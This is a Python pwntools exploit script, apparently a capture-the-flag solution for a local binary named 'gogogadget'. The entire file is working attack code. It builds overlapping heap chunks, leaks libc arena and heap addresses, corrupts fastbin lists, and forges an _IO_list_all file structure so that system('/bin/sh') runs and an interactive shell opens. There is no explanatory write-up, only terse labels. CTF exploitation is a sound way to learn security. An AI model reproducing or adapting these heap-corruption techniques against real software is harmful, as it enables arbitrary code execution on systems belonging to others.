#!/usr/bin/env python
# coding=utf-8
from pwn import *

def Create(gadget):
	r.recvuntil('Go Go Gadget: ')
	r.sendline('1')
	r.recvuntil('Gadget :')
	r.sendline(gadget)
	
def Delete(index):
	r.recvuntil('Go Go Gadget: ')
	r.sendline('2')
	r.recvuntil('Gadget [id] :')
	r.sendline(str(index))
	
def Gogo_Gadget():
	r.recvuntil('Go Go Gadget: ')
	r.sendline('3')
	
def Gogo_Copter():
	r.recvuntil('Go Go Gadget: ')
	r.sendline('6')
	
def Activate(speed, des):
	r.recvuntil('Go Go Gadget: ')
	r.sendline('4')
	r.recvuntil('Speed :')
	r.sendline(str(speed))
	r.recvuntil('Destination :')
	r.send(des)
	
def Deactivate():
	r.recvuntil('Go Go Gadget: ')
	r.sendline('5')


r = process('./gogogadget')
#raw_input('?')	

# Make overlapped
Create("a"*16) #0
Create(p64(0x61)*20) #1
Create("a"*16) #2
payload = "\x00"*0x90
payload += p64(0x200)*2
Create(payload) #3
Create("a"*16) #4
Delete(0) #0
Delete(1) #1
Delete(2) #2
Delete(3) #3
Create(p64(0x61)*28) #0
Create("Gadget") #1
Activate(10, "\x78")
Delete(1)
Delete(4)
Create("Gadget") #1
Gogo_Copter()
r.recvuntil('Gogo Copter To: ')
tmp = r.recv(6)+'\x00'*2
arena = u64(tmp)
log.info("arena: %#x" %arena)
io_list_all = arena+0x9a8
log.info("io_list_all: %#x" %io_list_all)
Deactivate()
Create("\x00"*0xa0) #2
payload = "\x00"*0x58
payload += p64(0x61)
Create(payload) #3
payload = p64(0x101)*20
Create(payload) #4
Delete(1) #1 fastbins dup
#Done overlapped
#leak heap
Activate(0xb1, "\x50") #malloc chunk size 0x60
Gogo_Copter()
r.recvuntil('Gogo Copter To: ')
tmp = r.recv(6)+'\x00'*2
heap = u64(tmp)
log.info("heap: %#x" %heap)

#change fastbins list
Deactivate()
Delete(3) #3
payload = "\x00"*0x58
payload += p64(0x61)
payload += p64(heap-0xb0)
payload += p64(0x101)*5
Create(payload) #1 fake copter to size 0x60
system = arena-0x37f7e8
log.info("system: %#x" %system)
payload = p64(0)*3
payload += p64(system)

Activate(0xb1, payload) #malloc chunk size 0x60
Delete(1) #1
payload = "\x00"*0x18
payload += p64(heap-0xb0+0x30)
payload += "\x00"*0x38
payload += p64(0x31)
payload += p64(0x101)*6
Create(payload) #1 fake copter to size 0x30
#Delete(4) #4
Delete(1) #1
Delete(2) #2
Deactivate()
payload = "/bin/sh\x00"
payload += p64(0x61)
payload += p64(arena)
payload += p64(io_list_all-0x10)
payload += p64(2)
payload += p64(3)
payload += p64(0)
payload += p64(system)
Activate(0, payload)
r.recvuntil('Go Go Gadget: ')
r.sendline('1')
r.interactive()

